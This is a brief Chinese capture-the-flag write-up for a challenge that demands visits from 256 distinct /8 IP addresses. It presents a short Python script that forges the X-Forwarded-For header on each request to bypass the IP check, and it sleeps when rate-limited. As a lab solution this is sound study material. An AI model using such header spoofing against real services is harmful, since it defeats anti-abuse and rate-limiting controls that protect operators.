# FLAG 助力大红包

总结题意：你需要用 256 个不同的 /8 IP 地址砍红包（访问对应 URL）。

但是这怎么可能呢，有些 IP 段本来就是有保留用途的，而且时间还限制 10 分钟。

<del>经过一番胡思乱想</del>，发现可以通过携带 `X-Forwarded-For` header 来欺骗，就能轻松砍到 flag。

```python
import requests
import time

for i in range(256):
    while True:
        r = requests.post(
            'http://202.38.93.111:10888/invite/...',
            data={ 'ip': f'{i}.1.1.1' },
            headers={ 'X-Forwarded-For': f'{i}.1.1.1' })

        if '助力成功！' in r.text:
            print(f'Success {i}')
            break
        elif '操作速度太快了' in r.text:
            print(f'Too fast, sleep')
            time.sleep(1)
```
